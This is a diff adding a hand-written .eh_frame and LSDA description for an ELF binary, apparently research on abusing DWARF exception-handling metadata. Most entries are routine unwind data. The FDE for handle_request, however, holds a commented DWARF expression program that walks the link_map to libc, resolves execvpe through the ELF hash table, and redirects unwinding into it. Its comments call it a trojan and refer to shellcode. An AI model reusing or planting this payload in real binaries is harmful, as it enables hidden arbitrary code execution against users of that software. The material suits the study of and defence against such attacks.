@@ -1,0 +1,659 @@
+section_type: ".eh_frame"
+#
+section_addr: 0x401050
+eh_hdr_addr: 0x400ff8
+except_table_addr: 0x401234
+eh_hdr_table_enc: DW_EH_PE_sdata4, DW_EH_PE_datarel
+begin CIE
+index: 0
+version: 1
+data_align: -8
+code_align: 1
+return_addr_rule: 16
+fde_ptr_enc: DW_EH_PE_sdata4, DW_EH_PE_pcrel
+begin INSTRUCTIONS
+DW_CFA_def_cfa r7 8 
+DW_CFA_offset r16 1
+DW_CFA_undefined r0
+end INSTRUCTIONS
+end CIE
+begin CIE
+index: 1
+version: 1
+data_align: -8
+code_align: 1
+return_addr_rule: 16
+fde_ptr_enc: DW_EH_PE_sdata4, DW_EH_PE_pcrel
+begin INSTRUCTIONS
+DW_CFA_def_cfa r7 8 
+DW_CFA_offset r16 1
+end INSTRUCTIONS
+end CIE
+begin CIE
+index: 2
+version: 1
+data_align: -8
+code_align: 1
+return_addr_rule: 16
+fde_ptr_enc: DW_EH_PE_sdata4, DW_EH_PE_pcrel
+fde_lsda_ptr_enc: DW_EH_PE_udata4
+personality_ptr_enc: DW_EH_PE_udata4
+personality: 0x400a40
+begin INSTRUCTIONS
+DW_CFA_def_cfa r7 8 
+DW_CFA_offset r16 1
+end INSTRUCTIONS
+end CIE
+# #function guess: ?
+# begin FDE
+# index: 0
+# cie_index: 1
+# initial_location: 0x400930
+# address_range: 0x150
+# begin INSTRUCTIONS
+# DW_CFA_def_cfa_offset 16
+# DW_CFA_advance_loc 6
+# DW_CFA_def_cfa_offset 24
+# DW_CFA_advance_loc 10
+# DW_CFA_def_cfa_expression begin EXPRESSION
+# 		DW_OP_breg7 8
+# 		DW_OP_breg16 0
+# 		DW_OP_lit15
+# 		DW_OP_and
+# 		DW_OP_lit11
+# 		DW_OP_ge
+# 		DW_OP_lit3
+# 		DW_OP_shl
+# 		DW_OP_plus
+# end EXPRESSION
+# end INSTRUCTIONS
+# end FDE
+#function guess: main
+begin FDE
+index: 0
+cie_index: 2
+initial_location: 0x400a80
+address_range: 0xd5
+lsda_idx: 0x0
+begin INSTRUCTIONS
+#DW_CFA_advance_loc 2
+#DW_CFA_def_cfa_offset 16
+#DW_CFA_offset r13 2
+#DW_CFA_advance_loc 2
+#DW_CFA_def_cfa_offset 24
+#DW_CFA_offset r12 3
+#DW_CFA_advance_loc 6
+#DW_CFA_def_cfa_offset 32
+#DW_CFA_offset r6 4
+#DW_CFA_advance_loc 1
+#DW_CFA_def_cfa_offset 40
+#DW_CFA_offset r3 5
+#DW_CFA_advance_loc 9
+#DW_CFA_def_cfa_offset 48
+#DW_CFA_advance_loc1 96
+#DW_CFA_remember_state
+#DW_CFA_def_cfa_offset 40
+#DW_CFA_advance_loc 1
+#DW_CFA_def_cfa_offset 32
+#DW_CFA_advance_loc 1
+#DW_CFA_def_cfa_offset 24
+#DW_CFA_advance_loc 2
+#DW_CFA_def_cfa_offset 16
+#DW_CFA_advance_loc 2
+#DW_CFA_def_cfa_offset 8
+#DW_CFA_advance_loc 1
+#DW_CFA_restore_state
+end INSTRUCTIONS
+end FDE
+# #function guess: _start
+# begin FDE
+# index: 2
+# cie_index: 0
+# initial_location: 0x400b55
+# address_range: 0x2a
+# begin INSTRUCTIONS
+# end INSTRUCTIONS
+# end FDE
+# #function guess: handler(int)
+# begin FDE
+# index: 3
+# cie_index: 1
+# initial_location: 0x400c50
+# address_range: 0xb
+# begin INSTRUCTIONS
+# DW_CFA_advance_loc 4
+# DW_CFA_def_cfa_offset 16
+# end INSTRUCTIONS
+# end FDE
+# #function guess: error(char const*)
+# begin FDE
+# index: 4
+# cie_index: 1
+# initial_location: 0x400c60
+# address_range: 0x1a
+# begin INSTRUCTIONS
+# DW_CFA_advance_loc 1
+# DW_CFA_def_cfa_offset 16
+# DW_CFA_offset r3 2
+# DW_CFA_advance_loc 20
+# DW_CFA_def_cfa_offset 8
+# end INSTRUCTIONS
+# end FDE
+# #function guess: read_until(char, unsigned int)
+# begin FDE
+# index: 5
+# cie_index: 1
+# initial_location: 0x400c80
+# address_range: 0x76
+# begin INSTRUCTIONS
+# DW_CFA_advance_loc 2
+# DW_CFA_def_cfa_offset 16
+# DW_CFA_offset r13 2
+# DW_CFA_advance_loc 2
+# DW_CFA_def_cfa_offset 24
+# DW_CFA_offset r12 3
+# DW_CFA_advance_loc 3
+# DW_CFA_def_cfa_offset 32
+# DW_CFA_offset r6 4
+# DW_CFA_advance_loc 1
+# DW_CFA_def_cfa_offset 40
+# DW_CFA_offset r3 5
+# DW_CFA_advance_loc 15
+# DW_CFA_def_cfa_offset 64
+# DW_CFA_advance_loc 55
+# DW_CFA_remember_state
+# DW_CFA_def_cfa_offset 40
+# DW_CFA_advance_loc 1
+# DW_CFA_def_cfa_offset 32
+# DW_CFA_advance_loc 1
+# DW_CFA_def_cfa_offset 24
+# DW_CFA_advance_loc 2
+# DW_CFA_def_cfa_offset 16
+# DW_CFA_advance_loc 2
+# DW_CFA_def_cfa_offset 8
+# DW_CFA_advance_loc 4
+# DW_CFA_restore_state
+# end INSTRUCTIONS
+# end FDE
+#function guess: handle_request(char*, char*)
+begin FDE
+index: 1 
+cie_index: 1
+initial_location: 0x400d00
+address_range: 0x1b0
+begin INSTRUCTIONS
+DW_CFA_advance_loc 2
+DW_CFA_def_cfa_offset 16
+DW_CFA_offset r12 2
+DW_CFA_advance_loc 1
+DW_CFA_def_cfa_offset 24
+DW_CFA_offset r6 3
+DW_CFA_advance_loc 6
+DW_CFA_def_cfa_offset 32
+DW_CFA_offset r3 4
+DW_CFA_advance_loc 12
+DW_CFA_def_cfa_offset 160
+DW_CFA_advance_loc1 214
+DW_CFA_remember_state
+DW_CFA_def_cfa_offset 32
+DW_CFA_advance_loc 1
+DW_CFA_def_cfa_offset 24
+DW_CFA_advance_loc 1
+DW_CFA_def_cfa_offset 16
+DW_CFA_advance_loc 2
+DW_CFA_def_cfa_offset 8
+DW_CFA_advance_loc 1
+DW_CFA_restore_state
+DW_CFA_val_expression r7
+begin EXPRESSION
+DW_OP_breg7 -48 
+end EXPRESSION
+DW_CFA_val_expression r13
+begin EXPRESSION
+DW_OP_constu 0x4011d0
+end EXPRESSION
+DW_CFA_val_expression r3
+begin EXPRESSION
+DW_OP_constu 0x4011de
+end EXPRESSION
+DW_CFA_val_expression r12
+begin EXPRESSION
+DW_OP_constu 0x0
+end EXPRESSION
+DW_CFA_val_expression r6
+begin EXPRESSION
+#DW_OP_constu 0x601218 #the address where we will find the address of the linkmap. This is 8 more than the value of PLTGOT in .dynamic
+DW_OP_constu 0x601488 #the address where we will find the address of the linkmap. This is 8 more than the value of PLTGOT in .dynamic
+DW_OP_deref #dereference above
+#now on the top of the stack we have the address of the beginning of
+#the link map. The important field in link_map for the moment is the
+#l_next field, which we see on 64-bit is 24 bytes from the start of
+#the structure. For the particular program we care about, libc will be
+#the 6th entry in the linkmap chain. We can tell this by looking at
+#its place in the NEEDED entries in .dynamic and adding two. There are
+#two entries with no names first. I do not know why they are there, and
+#I need to test on a variety of systems to see if this holds. Any of
+#this is *not* guaranteed by any standard. If there was randomization
+#going on of any sort we could still function but we would have to
+#compare strings, a lot more operations to do
+
+#we want to do add 24 to the address and dereference 5 times to get to
+#point to libc
+DW_OP_lit5
+#loop begins here
+DW_OP_swap
+DW_OP_lit24
+DW_OP_plus
+DW_OP_deref
+#now at the top of the stack is the value of l_next for the next
+#linkmap entry
+DW_OP_swap #now at the top of the stack is our loop counter
+DW_OP_lit1
+DW_OP_minus #decrement
+DW_OP_dup #since bra will pop the top entry
+DW_OP_bra -11 #8 1-byte instructions to top of loop plus 3 bytes for
+              #the bra itself
+DW_OP_drop #get rid of the counter
+#to actually find the symbol table of the program we need to look in
+#its .dynamic section. We grab l_ld which is 16 bytes into the
+#structure
+#first we grab the address though because symbols aren't always
+#relocated, we may have to do that manually. todo: sort out exactly
+#when this is the case
+DW_OP_dup
+DW_OP_deref
+DW_OP_swap
+DW_OP_lit16
+DW_OP_plus
+DW_OP_deref
+#we care about DT_HASH, DT_STRTAB, and DT_SYMTAB for now we'll be lazy
+#and assume that these are at fixed positions in the dynamic
+#section. This is a reasonable assumption since there is no reason for
+#the ordering of entries .dynamic to change with any frequency. If we
+#really want a general purpose trojan we can loop through everything
+#and test
+#l_dyn gives us the start of an array. DT_HASH is (in the libc.so.6 I
+#am attacking) the 5th entry (counting from 0), DT_STRTAB the 7th and
+#DT_SYMTAB the 8th. Each .dynamic entry is 16 bytes long with the
+#value in the 2nd 8 bytes (see Elf64_Dyn in elf.h)
+DW_OP_constu 136 #8*16+8
+DW_OP_plus
+DW_OP_dup
+#stack is now:
+#0. addr of DT_SYMTAB
+#1. addr of DT_SYMTAB
+#2. text base address
+DW_OP_deref
+DW_OP_swap
+#stack is now:
+#0. addr of DT_SYMTAB
+#1. DT_SYMTAB value (address of the hash table)
+#2. text base address
+DW_OP_lit16
+DW_OP_minus
+DW_OP_dup
+DW_OP_deref
+DW_OP_swap
+#stack is now:
+#0.addr of DT_STRTAB
+#1. DT_STRTAB value
+#2. DT_SYMTAB value
+#3. text base address
+DW_OP_constu 32
+DW_OP_minus
+DW_OP_deref
+#Stack is now
+#0. DT_HASH value (address of hash table)
+#1. DT_STRTAB value (address of strtab)
+#2. DT_SYMTAB value (address of the symbol table)
+#3. text base address
+#now we get nBuckets and the pointers to buckets and chains
+DW_OP_dup
+DW_OP_deref_size 4 #observing libc hashtable to be 32-bit even though I have different code in Katana
+#ok, we have nBuckets
+DW_OP_swap
+DW_OP_lit8
+DW_OP_plus
+DW_OP_dup
+#ok, we have buckets
+#Stack is now
+#0. hashtable address + 8
+#1. buckets address
+#2. nBuckets
+#3. DT_STRTAB value (address of strtab)
+#4. DT_SYMTAB value (address of the symbol table)
+#5. text base address
+#the chains begin after the buckets
+DW_OP_pick 2 #nBuckets
+DW_OP_lit4
+DW_OP_mul
+DW_OP_plus
+#Stack is now
+#0. chains address
+#1. buckets address
+#2. nBuckets
+#3. DT_STRTAB value (address of strtab)
+#4. DT_SYMTAB value (address of the symbol table)
+#5. text base address
+#now we have to compute the symbol hash mod the number of buckets
+#DW_OP_constu 7138204 #elf_hash("execl")
+DW_OP_constu 216771845 #elf_hash("execvpe")
+DW_OP_pick 3 #nBuckets
+DW_OP_mod
+#Stack is now
+#0  bucket index
+#1. chains address
+#2. buckets address
+#3. nBuckets
+#4. DT_STRTAB value (address of strtab)
+#5. DT_SYMTAB value (address of the symbol table)
+#6. text base address
+DW_OP_lit4
+DW_OP_mul
+#now we have an offset into the hash table
+DW_OP_pick 2 #buckets address
+DW_OP_plus
+#now we have the address of a symbol index
+DW_OP_deref_size 4 #now we have a symbol index
+DW_OP_dup
+#####chain loop begins here 
+CHAIN:
+#0  sym idx
+#1. sym idx
+#2. chains address
+#3. buckets address
+#4. nBuckets
+#5. DT_STRTAB value (address of strtab)
+#6. DW_SYMTAB value (address of the symbol table)
+#7. text base address
+DW_OP_constu 24 #24 bytes in a dynamic symbol in libc. We could read
+                #this from DT_SYMENT. I'm not sure why dynamic symbols
+                #are a different size
+DW_OP_mul  #multiply the symIdx * sizeof(Elf32_Sym)
+DW_OP_pick 6 #we want to get an address in symtab
+DW_OP_plus
+#Stack is now
+#0  symbol address
+#1. sym idx
+#2. chains address
+#3. buckets address
+#4. nBuckets
+#5. DT_STRTAB value (address of strtab)
+#6. DT_SYMTAB value (address of the symbol table)
+#7. text base address
+#Now get the name of the symbol
+DW_OP_dup #keep a copy of the address in case it's what we want
+DW_OP_deref_size 4 #first field in ElfXX_Sym is st_name
+DW_OP_pick 6 #get the address of strtab
+DW_OP_plus
+#Stack is now
+#0. symbol name address
+#1. symbol address
+#2. sym idx
+#3. chains address
+#4. buckets address
+#5. nBuckets
+#6. DT_STRTAB value (address of strtab)
+#7. DT_SYMTAB value (address of the symbol table)
+#8. text base address
+#We have stored the address of the name we are trying to match in
+#our inserted "shellcode" data
+DW_OP_constu 0x4011f6 #address of our symbol name
+#begin strcmp
+DW_OP_over
+DW_OP_deref_size 1
+DW_OP_over
+DW_OP_deref_size 1
+#Stack is now
+#0. 1st character in stored name
+#1. 1st character in this symbol name
+#2. stored name address
+#3. symbol name address
+#4. symbol address
+#5. sym idx
+#etc
+#####begin strcmp loop 
+STRCMP:
+#we want to exit the loop if one character is NULL
+DW_OP_over
+DW_OP_lit0
+DW_OP_eq
+#Stack is now
+#0. whether 1st charcter in symbol name is NULL
+#1. 1st character in stored name
+#2. 1st character in this symbol name
+DW_OP_over
+DW_OP_lit0
+DW_OP_eq
+#0. whether 1st charcter in stored name is NULL
+#1. whether 1st charcter in symbol name is NULL
+#2. 1st character in stored name
+#3. 1st character in this symbol name
+#4. stored name address
+#5. symbol name address
+#6. symbol address
+DW_OP_bra FIRST_NULL
+DW_OP_bra  CHAIN_NEXT #one is null and the other is not, so next chain
+DW_OP_skip NEITHER_NULL
+FIRST_NULL:
+DW_OP_bra FOUND_SYMBOL
+DW_OP_skip CHAIN_NEXT #one is null and the other is not, so next chain
+NEITHER_NULL:
+#compare them
+DW_OP_ne
+DW_OP_bra CHAIN_NEXT #characters are not equal
+#characters are equal
+#stack is now
+#0. stored name address
+#1. symbol name address
+#2. symbol address
+#3. sym idx
+#etc
+DW_OP_lit1
+DW_OP_plus
+DW_OP_dup
+DW_OP_deref_size 1 #get the next character
+DW_OP_swap
+#stack is 
+#0. stored address  
+#1.next character from stored
+#2. symbol name address
+#etc
+DW_OP_rot #top is now 0.next character 1. symbol name address 2. stored address
+DW_OP_swap #top is now 0. symbol name address 1.next character 2. stored address
+DW_OP_lit1
+DW_OP_plus
+DW_OP_dup
+DW_OP_deref_size 1 #get the next character
+#stack is
+# 0. next character from symbol
+# 1. symbol name address
+# 2. next character from stored
+# 3. stored address
+#etc
+DW_OP_rot
+DW_OP_rot
+#stack is
+# 0. next character from stored
+# 1. next character from symbol
+# 2. symbol name address
+# 3. stored address
+#etc
+DW_OP_skip STRCMP
+CHAIN_NEXT:
+#stack is now
+#0. stored name address
+#1. symbol name address
+#2. symbol address
+#3. sym idx
+#4. chains address
+#etc
+#we drop the first three entries, we don't care about them any more as
+#we are going to the next symbol in the chain
+DW_OP_drop 
+DW_OP_drop
+DW_OP_drop
+#stack is now
+#0. sym idx
+#1. chains address
+#etc
+DW_OP_lit8 #size of an Elf64_Word
+DW_OP_mul
+DW_OP_over
+DW_OP_plus
+DW_OP_dup
+#stack is now
+#0. new sym idx
+#1. new sym idx
+#2. chains address
+#etc
+DW_OP_skip CHAIN
+FOUND_SYMBOL:
+#stack is now
+#0. character
+#1. character
+#2. stored name address
+#3. symbol name address
+#4. symbol address
+#5. sym idx
+#6. chains address
+#7. buckets address
+#8. nBuckets
+#9. DT_STRTAB value (address of strtab)
+#10. DT_SYMTAB value (address of the symbol table)
+#11. text base address
+#etc
+DW_OP_drop
+DW_OP_drop
+DW_OP_drop
+DW_OP_drop
+#now we get st_value from the symbol. This is at an offset of 8 bytes
+#in a dynamic symbol
+DW_OP_lit8
+DW_OP_plus
+DW_OP_deref
+#now we need to relocate this against the text base
+#1. execl address
+#2. sym idx
+#3. chains address
+#4. buckets address
+#5. nBuckets
+#6. DT_STRTAB value (address of strtab)
+#7. DT_SYMTAB value (address of the symbol table)
+#8. text base address
+DW_OP_rot
+DW_OP_drop
+DW_OP_drop
+#1. execl address
+#4. buckets address
+#5. nBuckets
+#6. DT_STRTAB value (address of strtab)
+#7. DT_SYMTAB value (address of the symbol table)
+#8. text base address
+DW_OP_rot
+DW_OP_drop
+DW_OP_drop
+#0. execl address
+#1. DT_STRTAB value (address of strtab)
+#2. DT_SYMTAB value (address of the symbol table)
+#3. text base address
+DW_OP_rot
+DW_OP_drop
+DW_OP_drop
+#0. execl address
+#1. text base address
+DW_OP_plus
+#now we should have the address of execl on the top of the stack
+#DW_OP_constu 0x133 #we want to start 0x133 bytes into the function
+DW_OP_constu 0x32
+DW_OP_plus
+end EXPRESSION
+end INSTRUCTIONS
+end FDE
+# #function guess: __libc_csu_init
+# begin FDE
+# index: 7
+# cie_index: 1
+# initial_location: 0x400eb0
+# address_range: 0x65
+# begin INSTRUCTIONS
+# DW_CFA_advance_loc 2
+# DW_CFA_def_cfa_offset 16
+# DW_CFA_offset r15 2
+# DW_CFA_advance_loc 2
+# DW_CFA_def_cfa_offset 24
+# DW_CFA_offset r14 3
+# DW_CFA_advance_loc 5
+# DW_CFA_def_cfa_offset 32
+# DW_CFA_offset r13 4
+# DW_CFA_advance_loc 2
+# DW_CFA_def_cfa_offset 40
+# DW_CFA_offset r12 5
+# DW_CFA_advance_loc 8
+# DW_CFA_def_cfa_offset 48
+# DW_CFA_offset r6 6
+# DW_CFA_advance_loc 8
+# DW_CFA_def_cfa_offset 56
+# DW_CFA_offset r3 7
+# DW_CFA_advance_loc 15
+# DW_CFA_def_cfa_offset 64
+# DW_CFA_advance_loc 48
+# DW_CFA_def_cfa_offset 56
+# DW_CFA_advance_loc 1
+# DW_CFA_def_cfa_offset 48
+# DW_CFA_advance_loc 1
+# DW_CFA_def_cfa_offset 40
+# DW_CFA_advance_loc 2
+# DW_CFA_def_cfa_offset 32
+# DW_CFA_advance_loc 2
+# DW_CFA_def_cfa_offset 24
+# DW_CFA_advance_loc 2
+# DW_CFA_def_cfa_offset 16
+# DW_CFA_advance_loc 2
+# DW_CFA_def_cfa_offset 8
+# end INSTRUCTIONS
+# end FDE
+# #function guess: __libc_csu_fini
+# begin FDE
+# index: 8
+# cie_index: 1
+# initial_location: 0x400f20
+# address_range: 0x2
+# begin INSTRUCTIONS
+# end INSTRUCTIONS
+# end FDE
+#LSDA 0
+begin LSDA
+lpstart: 0x0
+typeinfo_enc: DW_EH_PE_udata4
+#call site 0
+begin CALL_SITE
+position: 0x2d
+length: 0x33
+landing_pad: 0x0
+has_action: false
+end CALL_SITE
+#call site 1
+begin CALL_SITE
+position: 0x69
+length: 0x5
+# landing_pad: 0xb8
+landing_pad: 0x7a
+has_action: true
+first_action: 0
+end CALL_SITE
+#call site 2
+begin CALL_SITE
+position: 0x9f
+length: 0x27
+landing_pad: 0x0
+has_action: false
+end CALL_SITE
+#action 0
+begin ACTION
+type_idx: 0
+next: none
+end ACTION
+#type entry 0
+typeinfo: 0x601560
+end LSDA
